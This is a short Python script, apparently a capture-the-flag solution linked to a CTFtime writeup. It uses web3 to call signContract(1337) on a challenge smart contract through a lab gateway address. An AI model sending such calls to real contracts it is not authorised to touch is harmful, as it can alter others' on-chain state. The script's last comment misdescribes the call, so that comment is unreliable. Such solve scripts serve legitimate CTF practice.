#https://ctftime.org/writeup/36492

from web3 import Web3
from solcx import compile_source, install_solc

# installs solc compiler, necessary only for first execution
install_solc("0.8.18")

# compiles source code to get the contract abi
with open("Contract.sol", "rt") as fp:
    src = fp.read()
compiled = compile_source(src, output_values=["abi"])
contract_id, contract_interface = compiled.popitem()
abi = contract_interface['abi']

# contract adress (given in the tcp interface)
target = '0x8b49D3C4B58cf8fB71e2Ec3B04C70560Ed8bB8E3'

w3 = Web3(Web3.HTTPProvider("http://94.237.59.199:56351")) # blockchain gateway from tcp interface
contract = w3.eth.contract(address=target, abi=abi)
contract.functions.signContract(1337).transact() # calls update sensor with value of 10
